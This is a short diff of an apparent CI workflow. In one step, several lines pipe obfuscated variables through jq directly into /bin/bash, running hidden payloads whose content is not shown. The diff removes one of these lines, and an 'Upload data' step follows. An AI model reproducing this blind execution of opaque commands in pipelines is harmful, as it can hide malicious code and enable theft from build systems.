@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$vxlzt11" | jq -r .sdnid394 | /bin/bash
           echo $bu62 | jq -r .o2 | /bin/bash
-          echo $ccq63888 | jq -r .hy49692 | /bin/bash
           echo $qfn39613 | jq -r .nd86490 | /bin/bash
 
       - name: Upload data
